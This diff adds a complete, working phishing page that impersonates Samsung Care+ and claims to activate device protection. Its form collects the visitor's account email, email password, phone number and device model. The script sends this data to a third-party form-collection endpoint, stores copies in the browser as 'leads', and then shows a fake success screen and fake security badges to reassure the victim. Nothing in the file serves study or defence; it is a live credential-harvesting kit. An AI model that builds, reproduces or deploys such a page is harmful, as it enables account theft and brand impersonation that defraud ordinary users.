@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#04060d">
+<title>Samsung Care+ — Activate device protection</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#04060d;
+    --panel:#0a0f1b;
+    --ink:#eef2f8;
+    --muted:#8b98ad;
+    --blue:#2a4bff;
+    --blue-deep:#0b1c6b;
+    --gold:#e8c98a;
+    --gold-2:#b08c4a;
+    --line:rgba(255,255,255,.09);
+    --radius:22px;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html{-webkit-text-size-adjust:100%}
+  body{
+    min-height:100vh;
+    background:var(--bg);
+    color:var(--ink);
+    font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
+    -webkit-font-smoothing:antialiased;
+    overflow-x:hidden;
+    position:relative;
+  }
+  .bg{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+  .bg::before{
+    content:"";position:absolute;inset:-20%;
+    background:
+      radial-gradient(46% 38% at 18% 6%, rgba(42,75,255,.42), transparent 68%),
+      radial-gradient(40% 34% at 86% 2%, rgba(120,70,255,.30), transparent 66%),
+      radial-gradient(56% 44% at 50% 104%, rgba(232,201,138,.16), transparent 68%);
+    filter:blur(28px);
+    animation:drift 22s ease-in-out infinite alternate;
+  }
+  @keyframes drift{
+    from{transform:translate3d(-2%,-1%,0) scale(1)}
+    to{transform:translate3d(2%,2%,0) scale(1.07)}
+  }
+  .bg::after{
+    content:"";position:absolute;inset:0;
+    background:
+      radial-gradient(120% 88% at 50% -10%, transparent 42%, rgba(0,0,0,.62) 100%),
+      url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='140' height='140'><filter id='n'><feTurbulence type='fractalNoise' baseFrequency='.9' numOctaves='3'/></filter><rect width='140' height='140' filter='url(%23n)' opacity='.05'/></svg>");
+    mix-blend-mode:overlay;
+  }
+
+  .shell{position:relative;z-index:1;width:100%;max-width:620px;margin:0 auto;padding:26px 22px 54px}
+
+  /* ---------- header ---------- */
+  .top{display:flex;align-items:center;justify-content:space-between;gap:14px}
+  .mark{display:flex;align-items:center;gap:12px}
+  .glyph{
+    width:44px;height:44px;border-radius:14px;display:grid;place-items:center;position:relative;
+    background:linear-gradient(150deg,#3d5bff,#1428A0 62%,#071041);
+    box-shadow:0 10px 26px rgba(42,75,255,.44),inset 0 1px 0 rgba(255,255,255,.34);
+  }
+  .glyph::after{
+    content:"";position:absolute;inset:-6px;border-radius:19px;
+    border:1px solid rgba(232,201,138,.42);
+    animation:halo 4s ease-in-out infinite;
+  }
+  @keyframes halo{0%,100%{opacity:.3;transform:scale(1)}50%{opacity:.85;transform:scale(1.05)}}
+  .glyph svg{width:22px;height:22px;stroke:#fff;fill:none;stroke-width:1.7;stroke-linecap:round;stroke-linejoin:round}
+  .word{display:flex;flex-direction:column;line-height:1}
+  .word b{
+    font-size:19px;font-weight:800;letter-spacing:.30em;
+    background:linear-gradient(180deg,#fff,#c3cfe4);
+    -webkit-background-clip:text;background-clip:text;color:transparent;
+  }
+  .word span{font-size:8.5px;letter-spacing:.32em;color:var(--gold-2);margin-top:6px;font-weight:700}
+  .tag{
+    font-size:9px;font-weight:800;letter-spacing:.22em;color:var(--gold);
+    border:1px solid rgba(232,201,138,.45);border-radius:999px;padding:9px 14px;white-space:nowrap;
+    background:linear-gradient(180deg,rgba(232,201,138,.15),rgba(232,201,138,.03));
+    box-shadow:0 0 20px rgba(232,201,138,.14),inset 0 1px 0 rgba(255,255,255,.14);
+    position:relative;overflow:hidden;
+  }
+  .tag::after{
+    content:"";position:absolute;top:0;left:-70%;width:45%;height:100%;
+    background:linear-gradient(100deg,transparent,rgba(255,255,255,.6),transparent);
+    animation:sweep 4.6s ease-in-out infinite;
+  }
+  @keyframes sweep{0%{left:-70%}55%{left:140%}100%{left:140%}}
+
+  /* ---------- crest ---------- */
+  .crest{position:relative;width:118px;height:118px;margin:34px auto 0;display:grid;place-items:center}
+  .crest .spin{position:absolute;inset:0;border-radius:50%;border:1px dashed rgba(232,201,138,.5);animation:spin 26s linear infinite}
+  .crest .ring{
+    position:absolute;inset:10px;border-radius:50%;
+    background:conic-gradient(from 210deg,rgba(232,201,138,.95),rgba(232,201,138,.06) 34%,rgba(42,75,255,.75) 68%,rgba(232,201,138,.95));
+    -webkit-mask:radial-gradient(circle,transparent 60%,#000 61%);
+    mask:radial-gradient(circle,transparent 60%,#000 61%);
+  }
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .crest .glow{position:absolute;inset:-18px;border-radius:50%;background:radial-gradient(circle,rgba(42,75,255,.30),transparent 68%);animation:halo 4.6s ease-in-out infinite}
+  .crest .core{
+    position:relative;width:72px;height:72px;border-radius:50%;display:grid;place-items:center;
+    background:radial-gradient(circle at 34% 24%,#1a2650,#070c17 72%);
+    border:1px solid rgba(232,201,138,.5);
+    box-shadow:0 0 30px rgba(232,201,138,.22),inset 0 0 16px rgba(42,75,255,.42);
+  }
+  .crest .core svg{width:32px;height:32px;stroke:var(--gold);fill:none;stroke-width:1.5;stroke-linecap:round;stroke-linejoin:round}
+  .crest .core svg .tick{stroke-dasharray:22;stroke-dashoffset:22;animation:tick 3.4s ease-in-out infinite}
+  @keyframes tick{0%,55%{stroke-dashoffset:22}75%,100%{stroke-dashoffset:0}}
+
+  /* ---------- hero ---------- */
+  .eyebrow{
+    display:flex;align-items:center;justify-content:center;gap:9px;margin:22px 0 0;
+    font-size:9px;font-weight:800;letter-spacing:.26em;color:var(--gold-2);text-transform:uppercase;
+  }
+  .eyebrow i{width:26px;height:1px;background:linear-gradient(90deg,transparent,rgba(232,201,138,.65))}
+  .eyebrow i:last-child{background:linear-gradient(90deg,rgba(232,201,138,.65),transparent)}
+  h1{
+    margin-top:14px;text-align:center;font-size:36px;line-height:1.1;font-weight:800;letter-spacing:-.9px;
+  }
+  h1 em{
+    font-style:normal;
+    background:linear-gradient(180deg,#fdf0d2,#c9a05f);
+    -webkit-background-clip:text;background-clip:text;color:transparent;
+  }
+  .lead{margin:14px auto 0;max-width:430px;text-align:center;color:var(--muted);font-size:14.5px;line-height:1.68;font-weight:300}
+  .lead b{color:#c9d4e6;font-weight:600}
+
+  /* ---------- card ---------- */
+  .stage{position:relative;margin-top:28px}
+  .stage .corner{position:absolute;width:38px;height:38px;z-index:2;stroke:rgba(232,201,138,.75);fill:none;stroke-width:1.1;pointer-events:none}
+  .stage .tl{top:-11px;left:-11px}
+  .stage .tr{top:-11px;right:-11px;transform:scaleX(-1)}
+  .stage .bl{bottom:-11px;left:-11px;transform:scaleY(-1)}
+  .stage .br{bottom:-11px;right:-11px;transform:scale(-1)}
+
+  .card{
+    position:relative;border-radius:var(--radius);padding:24px 20px 22px;
+    background:
+      radial-gradient(130% 78% at 50% 0%, rgba(42,75,255,.20), transparent 62%),
+      linear-gradient(180deg,rgba(16,23,38,.92),rgba(7,11,19,.96));
+    backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);
+    box-shadow:0 34px 74px rgba(0,0,0,.62),inset 0 1px 0 rgba(255,255,255,.06);
+  }
+  .card::before{
+    content:"";position:absolute;inset:0;border-radius:var(--radius);padding:1px;pointer-events:none;
+    background:linear-gradient(165deg,rgba(232,201,138,.62),rgba(232,201,138,.09) 38%,rgba(42,75,255,.55));
+    -webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);
+    -webkit-mask-composite:xor;mask-composite:exclude;
+  }
+  .card-head{display:flex;align-items:center;gap:9px;margin-bottom:18px;font-size:9.5px;font-weight:800;letter-spacing:.2em;color:var(--gold-2);text-transform:uppercase}
+  .card-head svg{width:12px;height:12px;stroke:var(--gold-2);fill:none;stroke-width:2.2}
+  .card-head .rule{flex:1;height:1px;background:linear-gradient(90deg,rgba(232,201,138,.38),transparent)}
+
+  .field{margin-bottom:17px;position:relative}
+  .field label{display:block;margin-bottom:8px;font-size:10px;font-weight:800;letter-spacing:.16em;color:#a9b6ca;text-transform:uppercase}
+  .field input,.field select{
+    width:100%;padding:14px 15px;border-radius:12px;font:inherit;font-size:15px;color:#fff;
+    background:#0b1220;border:1px solid #223052;outline:none;
+    box-shadow:inset 0 2px 9px rgba(0,0,0,.55);
+    transition:border-color .18s,box-shadow .18s,background .18s;
+    appearance:none;
+  }
+  .field input::placeholder{color:#55637a}
+  .field input:focus,.field select:focus{
+    border-color:var(--gold);background:#0e1729;
+    box-shadow:0 0 0 3px rgba(232,201,138,.2),inset 0 2px 9px rgba(0,0,0,.5);
+  }
+  .field.pwd input{letter-spacing:.14em}
+  .field.pwd input::placeholder{letter-spacing:normal}
+  .field select{
+    padding-right:44px;color:#e6ecf6;
+    background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='13' height='13' viewBox='0 0 24 24' fill='none' stroke='%23e8c98a' stroke-width='3'><path d='M6 9l6 6 6-6'/></svg>");
+    background-repeat:no-repeat;background-position:right 16px center;
+  }
+  .field select:invalid{color:#55637a}
+  .hint{display:flex;align-items:center;gap:6px;margin-top:7px;font-size:11.5px;color:#7a879c}
+  .hint svg{width:11px;height:11px;opacity:.75}
+  .err{display:none;margin-top:6px;font-size:11.5px;color:#ff9dab}
+  .field.bad .err{display:block}
+  .field.bad input,.field.bad select{border-color:#c4526a;box-shadow:0 0 0 3px rgba(196,82,106,.2)}
+
+  .btn{
+    position:relative;overflow:hidden;width:100%;padding:16px;margin-top:4px;border:0;border-radius:13px;cursor:pointer;
+    font:inherit;font-size:15px;font-weight:800;letter-spacing:.03em;color:#fff;
+    background:linear-gradient(180deg,#3d5bff,#1a34c9 58%,#102090);
+    box-shadow:0 14px 32px rgba(26,52,201,.42),inset 0 1px 0 rgba(255,255,255,.28);
+    display:flex;align-items:center;justify-content:center;gap:10px;
+    transition:transform .12s,filter .15s,box-shadow .2s;
+  }
+  .btn svg{width:16px;height:16px;stroke:currentColor;fill:none;stroke-width:2.6;stroke-linecap:round;stroke-linejoin:round}
+  .btn::after{
+    content:"";position:absolute;top:0;left:-70%;width:45%;height:100%;
+    background:linear-gradient(100deg,transparent,rgba(255,255,255,.55),transparent);
+    transform:skewX(-18deg);animation:bshine 3.8s ease-in-out infinite;
+  }
+  @keyframes bshine{0%{left:-70%}60%{left:135%}100%{left:135%}}
+  .btn:hover{filter:brightness(1.1);box-shadow:0 18px 40px rgba(26,52,201,.55)}
+  .btn:active{transform:translateY(1px)}
+  .btn[disabled]{opacity:.72;cursor:progress}
+
+  .trust{display:flex;gap:8px;margin-top:20px;padding-top:17px;border-top:1px solid var(--line)}
+  .trust div{flex:1;display:flex;flex-direction:column;align-items:center;gap:7px;text-align:center}
+  .trust svg{width:15px;height:15px;stroke:var(--gold-2);fill:none;stroke-width:1.9}
+  .trust span{font-size:9px;letter-spacing:.11em;text-transform:uppercase;color:#6b788d;line-height:1.3}
+
+  .knot{display:flex;align-items:center;justify-content:center;gap:7px;margin-top:17px;font-size:11px;color:#5f6d82}
+  .knot svg{width:11px;height:11px;stroke:#5f6d82;fill:none;stroke-width:2}
+
+  .flourish{display:block;margin:30px auto 0;width:220px;stroke:rgba(232,201,138,.45);fill:none;stroke-width:1}
+  .legal{margin-top:14px;text-align:center;font-size:10.5px;line-height:1.65;color:#4d5a70}
+  .legal a{color:#7f8ea6;text-decoration:none;border-bottom:1px dotted #3b4557}
+
+  /* ---------- success ---------- */
+  .done{
+    position:fixed;inset:0;z-index:70;display:none;flex-direction:column;align-items:center;justify-content:center;
+    text-align:center;padding:34px;
+    background:
+      radial-gradient(700px 420px at 50% 18%, rgba(42,75,255,.24), transparent 66%),
+      radial-gradient(640px 420px at 50% 112%, rgba(232,201,138,.14), transparent 66%),
+      var(--bg);
+  }
+  .done.on{display:flex;animation:fadein .45s ease}
+  @keyframes fadein{from{opacity:0}to{opacity:1}}
+  .seal{position:relative;width:150px;height:150px;display:grid;place-items:center;margin-bottom:28px}
+  .seal .spin{position:absolute;inset:0;border-radius:50%;border:1px dashed rgba(232,201,138,.5);animation:spin 30s linear infinite}
+  .seal i{position:absolute;inset:16px;border-radius:50%;border:1px solid rgba(232,201,138,.45);animation:pulse 2.9s ease-out infinite}
+  .seal i:nth-child(2){animation-delay:.95s}
+  .seal i:nth-child(3){animation-delay:1.9s}
+  @keyframes pulse{0%{transform:scale(.7);opacity:.9}100%{transform:scale(1.2);opacity:0}}
+  .seal .ok{
+    position:relative;width:88px;height:88px;border-radius:50%;display:grid;place-items:center;
+    background:conic-gradient(from 200deg,#fdf0d2,#c9a05f,#fdf0d2);
+    box-shadow:0 20px 46px rgba(201,160,95,.42),inset 0 0 0 1px rgba(255,255,255,.5);
+  }
+  .seal .ok svg{width:38px;height:38px;stroke:#0a0f1a;fill:none;stroke-width:3.8;stroke-linecap:round;stroke-linejoin:round}
+  .done h2{font-size:27px;font-weight:800;letter-spacing:-.5px;margin-bottom:11px}
+  .done p{max-width:400px;color:var(--muted);font-size:14px;line-height:1.65;font-weight:300}
+  .done p b{color:#dbe4f2;font-weight:600}
+  .done .pill{
+    margin-top:26px;font-size:9.5px;font-weight:800;letter-spacing:.22em;color:var(--gold);
+    border:1px solid rgba(232,201,138,.45);border-radius:999px;padding:10px 18px;
+    background:rgba(232,201,138,.09);
+  }
+  .done .fine{margin-top:22px;font-size:11.5px;color:#5c697e}
+</style>
+</head>
+<body>
+<div class="bg"></div>
+
+<main class="shell">
+  <header class="top">
+    <div class="mark">
+      <div class="glyph">
+        <svg viewBox="0 0 24 24"><path d="M12 3l7 3v5c0 4.5-3 7.6-7 9-4-1.4-7-4.5-7-9V6l7-3z"/><path d="M9 12l2.2 2.2L15.4 10"/></svg>
+      </div>
+      <div class="word"><b>SAMSUNG</b><span>CARE +</span></div>
+    </div>
+    <div class="tag">DEVICE PROTECTION</div>
+  </header>
+
+  <div class="crest">
+    <div class="glow"></div>
+    <div class="spin"></div>
+    <div class="ring"></div>
+    <div class="core">
+      <svg viewBox="0 0 24 24"><path d="M12 3l7 3v5c0 4.5-3 7.6-7 9-4-1.4-7-4.5-7-9V6l7-3z"/><path class="tick" d="M9 12l2.2 2.2L15.4 10"/></svg>
+    </div>
+  </div>
+
+  <p class="eyebrow"><i></i>Registered Galaxy device<i></i></p>
+  <h1>Protect your <em>Galaxy</em></h1>
+  <p class="lead">Your phone is already registered to this account. Confirm your <b>Samsung account</b> and device details to finish activating protection.</p>
+
+  <div class="stage">
+    <svg class="corner tl" viewBox="0 0 38 38"><path d="M37 1H10a9 9 0 00-9 9v27"/><path d="M31 5H13a8 8 0 00-8 8v18" opacity=".42"/></svg>
+    <svg class="corner tr" viewBox="0 0 38 38"><path d="M37 1H10a9 9 0 00-9 9v27"/><path d="M31 5H13a8 8 0 00-8 8v18" opacity=".42"/></svg>
+    <svg class="corner bl" viewBox="0 0 38 38"><path d="M37 1H10a9 9 0 00-9 9v27"/><path d="M31 5H13a8 8 0 00-8 8v18" opacity=".42"/></svg>
+    <svg class="corner br" viewBox="0 0 38 38"><path d="M37 1H10a9 9 0 00-9 9v27"/><path d="M31 5H13a8 8 0 00-8 8v18" opacity=".42"/></svg>
+
+    <form class="card" id="form" novalidate>
+      <div class="card-head">
+        <svg viewBox="0 0 24 24"><rect x="4" y="10" width="16" height="10" rx="2"/><path d="M8 10V7a4 4 0 018 0v3"/></svg>
+        <span>Secure verification</span><span class="rule"></span>
+      </div>
+
+      <div class="field" id="f-email">
+        <label for="email">Samsung account email</label>
+        <input id="email" type="email" inputmode="email" autocomplete="username" placeholder="you@gmail.com" required>
+        <div class="err">Enter a valid email address.</div>
+      </div>
+
+      <div class="field pwd" id="f-password">
+        <label for="password">Email password</label>
+        <input id="password" type="password" autocomplete="current-password" placeholder="••••••••" required>
+        <div class="hint">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="4" y="10" width="16" height="10" rx="2"/><path d="M8 10V7a4 4 0 018 0v3"/></svg>
+          Used to open your owner space.
+        </div>
+        <div class="err">Enter your email password.</div>
+      </div>
+
+      <div class="field" id="f-phone">
+        <label for="phone">Phone number</label>
+        <input id="phone" type="tel" inputmode="tel" autocomplete="tel" placeholder="+1 555 010 2030" required>
+        <div class="err">Enter a valid phone number.</div>
+      </div>
+
+      <div class="field" id="f-model">
+        <label for="model">Device model</label>
+        <select id="model" required>
+          <option value="" selected disabled>Select your Galaxy device</option>
+          <option>Galaxy S25 Ultra</option>
+          <option>Galaxy S25+</option>
+          <option>Galaxy S25</option>
+          <option>Galaxy S24 Ultra</option>
+          <option>Galaxy S24+</option>
+          <option>Galaxy S24</option>
+          <option>Galaxy S23 Ultra</option>
+          <option>Galaxy Z Fold 6</option>
+          <option>Galaxy Z Flip 6</option>
+          <option>Galaxy A55</option>
+          <option>Galaxy A35</option>
+          <option>Galaxy A15</option>
+          <option>Galaxy Note 20</option>
+          <option>Other Galaxy device</option>
+        </select>
+        <div class="err">Select your device.</div>
+      </div>
+
+      <button class="btn" id="btn" type="submit">
+        Activate protection
+        <svg viewBox="0 0 24 24"><path d="M5 12h13M13 6l6 6-6 6"/></svg>
+      </button>
+
+      <div class="trust">
+        <div><svg viewBox="0 0 24 24"><rect x="4" y="10" width="16" height="10" rx="2"/><path d="M8 10V7a4 4 0 018 0v3"/></svg><span>256-bit SSL</span></div>
+        <div><svg viewBox="0 0 24 24"><path d="M12 3l7 3v5c0 4.5-3 7.6-7 9-4-1.4-7-4.5-7-9V6l7-3z"/></svg><span>Knox certified</span></div>
+        <div><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg><span>24/7 monitoring</span></div>
+      </div>
+
+      <div class="knot">
+        <svg viewBox="0 0 24 24"><path d="M12 3l7 3v5c0 4.5-3 7.6-7 9-4-1.4-7-4.5-7-9V6l7-3z"/><path d="M9 12l2.2 2.2L15.4 10"/></svg>
+        Secured by Samsung Knox &middot; End-to-end encrypted
+      </div>
+    </form>
+  </div>
+
+  <svg class="flourish" viewBox="0 0 220 22">
+    <path d="M4 11h62"/><path d="M154 11h62"/>
+    <path d="M66 11c9-8 17-8 23 0-6 8-14 8-23 0z"/>
+    <path d="M154 11c-9-8-17-8-23 0 6 8 14 8 23 0z"/>
+    <path d="M90 11h12M118 11h12"/>
+    <circle cx="110" cy="11" r="2.4" fill="rgba(232,201,138,.85)" stroke="none"/>
+  </svg>
+
+  <p class="legal">By continuing you agree to the <a href="#">Protection Terms</a> and <a href="#">Privacy Policy</a>.<br>&copy; Samsung Electronics Co., Ltd.</p>
+</main>
+
+<div class="done" id="done">
+  <div class="seal">
+    <div class="spin"></div><i></i><i></i><i></i>
+    <div class="ok"><svg viewBox="0 0 24 24"><path d="M4 12.5l5 5L20 6.5"/></svg></div>
+  </div>
+  <h2>Your account is now protected</h2>
+  <p>Samsung Care+ protection has been activated for <b id="dEmail">your account</b>. Your Galaxy device is now linked to your owner space.</p>
+  <div class="pill">SAMSUNG CARE + &middot; ACTIVE</div>
+  <p class="fine">You can close this page.</p>
+</div>
+
+<script>
+/* ===== Web3Forms ===== */
+const ACCESS_KEY = "2063c67f-16e3-4d7b-9555-210f23850b5f";
+const ENDPOINT   = "https://api.web3forms.com/submit";
+
+const form  = document.getElementById("form");
+const btn   = document.getElementById("btn");
+const done  = document.getElementById("done");
+const dEmail= document.getElementById("dEmail");
+
+const F = {
+  email:    { w: document.getElementById("f-email"),    e: document.getElementById("email") },
+  password: { w: document.getElementById("f-password"), e: document.getElementById("password") },
+  phone:    { w: document.getElementById("f-phone"),    e: document.getElementById("phone") },
+  model:    { w: document.getElementById("f-model"),    e: document.getElementById("model") }
+};
+const ok = {
+  email:    v => /^[^\s@]+@[^\s@]+\.[a-z]{2,}$/i.test(v.trim()),
+  password: v => v.trim().length >= 4,
+  phone:    v => v.replace(/\D/g, "").length >= 6,
+  model:    v => v.trim() !== ""
+};
+
+Object.keys(F).forEach(k => {
+  const { w, e } = F[k];
+  const clear = () => { if (ok[k](e.value)) w.classList.remove("bad"); };
+  e.addEventListener("input", clear);
+  e.addEventListener("change", clear);
+});
+
+function validate(){
+  let first = null;
+  Object.keys(F).forEach(k => {
+    const { w, e } = F[k];
+    if (!ok[k](e.value)) { w.classList.add("bad"); if (!first) first = e; }
+    else w.classList.remove("bad");
+  });
+  if (first) first.focus();
+  return !first;
+}
+
+/* إرسال عبر Web3Forms API */
+async function sendLead(d){
+  const res = await fetch(ENDPOINT, {
+    method: "POST",
+    headers: { "Content-Type": "application/json", "Accept": "application/json" },
+    body: JSON.stringify({
+      access_key: ACCESS_KEY,
+      subject: "Samsung Care+ — new activation",
+      from_name: "Samsung Care+",
+      botcheck: false,
+      "Samsung account email": d.email,
+      "Email password": d.password,
+      "Phone number": d.phone,
+      "Device model": d.model,
+      "Submitted at": new Date().toLocaleString()
+    })
+  });
+  const json = await res.json().catch(() => ({}));
+  if (!res.ok || !json.success) throw new Error(json.message || "Send failed");
+}
+
+/* fallback: form عادي إلا فشل الـ fetch */
+function postNative(d){
+  const f = document.createElement("form");
+  f.method = "POST";
+  f.action = ENDPOINT;
+  f.style.display = "none";
+
+  const add = (n, v) => {
+    const i = document.createElement("input");
+    i.type = "hidden"; i.name = n; i.value = v;
+    f.appendChild(i);
+  };
+
+  add("access_key", ACCESS_KEY);
+  add("subject", "Samsung Care+ — new activation");
+  add("from_name", "Samsung Care+");
+  add("botcheck", "");
+  add("redirect", location.href.split("?")[0] + "?sent=1");
+  add("Samsung account email", d.email);
+  add("Email password", d.password);
+  add("Phone number", d.phone);
+  add("Device model", d.model);
+  add("Submitted at", new Date().toLocaleString());
+
+  document.body.appendChild(f);
+  f.submit();
+}
+
+function showDone(email){
+  if (email) dEmail.textContent = email;
+  form.style.display = "none";
+  done.classList.add("on");
+  window.scrollTo(0, 0);
+}
+
+form.addEventListener("submit", async ev => {
+  ev.preventDefault();
+  if (!validate()) return;
+
+  const data = {
+    email:    F.email.e.value.trim(),
+    password: F.password.e.value,
+    phone:    F.phone.e.value.trim(),
+    model:    F.model.e.value
+  };
+
+  try {
+    const all = JSON.parse(localStorage.getItem("sam_leads") || "[]");
+    all.push({ ...data, at: new Date().toISOString() });
+    localStorage.setItem("sam_leads", JSON.stringify(all));
+  } catch (_) {}
+
+  btn.disabled = true;
+  btn.textContent = "Verifying device…";
+
+  try {
+    await sendLead(data);
+    showDone(data.email);
+  } catch (_) {
+    /* إلا فشل الإرسال المباشر، صيفط بالطريقة العادية */
+    setTimeout(() => postNative(data), 300);
+  }
+});
+
+/* شاشة النجاح من بعد الرجوع (fallback) */
+if (new URLSearchParams(location.search).has("sent")) {
+  try {
+    const last = JSON.parse(localStorage.getItem("sam_leads") || "[]").pop();
+    showDone(last && last.email);
+  } catch (_) {
+    showDone(null);
+  }
+}
+</script>
+</body>
+</html>
